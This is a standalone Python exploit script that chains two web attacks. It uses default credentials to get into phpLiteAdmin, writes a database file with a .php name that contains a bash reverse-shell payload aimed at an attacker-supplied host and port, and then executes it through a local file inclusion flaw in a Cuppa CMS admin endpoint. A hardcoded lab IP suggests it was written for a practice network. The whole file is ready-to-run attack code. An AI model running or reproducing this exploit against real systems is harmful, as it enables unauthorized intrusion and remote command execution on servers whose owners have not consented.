import requests
import sys
import random
import json

class exploitchain(object):
    def __init__(self, targeturl, LHOST, LPORT):
        self.targeturl = targeturl
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.creds = {
            "password": "admin",
            "remember": "yes",
            "login": "Log+In",
            "proc_login": "true"
        }
        self.login = f"{self.targeturl}/db/phpliteadmin.php"
        self.create_table = f"{self.targeturl}/db/phpliteadmin.php?action=table_create"
        self.confirm_table = f"{self.targeturl}/db/phpliteadmin.php?action=table_create&confirm=1"
        self.webshell = f"exploit{str(random.randint(1,1000))}.php"
        self.table_name = f"table{str(random.randint(1,1000))}"
        self.switch_database = f"{self.targeturl}/db/phpliteadmin.php?switchdb=/usr/local/databases/{self.webshell}"
        self.validate_table = f"{self.targeturl}/db/phpliteadmin.php?table={self.table_name}&action=column_view"
        self.database = {
            "new_dbname": self.webshell
        }
        self.database_path = f"/usr/local/databases/{self.webshell}"
        self.init_table = {
            "tablename": self.table_name,
            "tablefields": "1",
            "createtable": "Go"
        }
        self.table_data = {
            "tablename": f"table{str(random.randint(1,1000))}",
            "rows": "1",
            "0_field": "abc",
            "0_type": "TEXT",
            "0_defaultvalue": f"<?php `/bin/bash -c \"bash -i >& /dev/tcp/{self.LHOST}/{self.LPORT} 0>&1\"` ?>"
        }

    def exploitphpliteadmin(self):
        self.header = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.5",
            "Referrer": "http://10.11.1.116/db/phpliteadmin.php?switchdb=/usr/local/databases/{self.webshell}"
        }

        with requests.Session() as sess:
            sess.post(self.login, data=self.creds)
            print(f"[*] Creating database named {self.webshell}")
            sess.post(self.login, data=self.database)
            res = sess.get(self.login)

            if f">{self.webshell}<" not in res.text:
                print("[!] database not detected in response.")
            else:
                print("[+] database successfully created.")

            print(f"[*] Creating tables and injecting php code")
            print(f"\t{self.table_data}")
            sess.get(self.switch_database)
            sess.post(self.create_table, headers=self.header, data=self.init_table)
            sess.post(self.confirm_table, headers=self.header, data=self.table_data)

    def exploitcuppa(self):
        self.cuppa_login = f"{self.targeturl}/administrator/"
        self.lfi = f"{self.targeturl}/administrator/alerts/alertConfigField.php"
        self.cuppa_creds = {
            "user": "admin",
            "password": "admin",
            "task": "login"
        }
        self.params = {
            "urlConfig": self.database_path
        }
        with requests.Session() as sess:
            sess.post(self.cuppa_login, data=self.cuppa_creds)
            print(f"[*] Performing Local File Inclusion: {self.lfi}?{self.params}")
            sess.get(self.lfi, params=self.params)

if __name__ == "__main__":
    print("Usage: exploit.py targeturl LHOST LPORT")
    targeturl = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    if targeturl.endswith("/"):
        print("Targeturl not formatted properly..")
        quit()

    exploit = exploitchain(targeturl, LHOST, LPORT)
    exploit.exploitphpliteadmin()
    exploit.exploitcuppa()
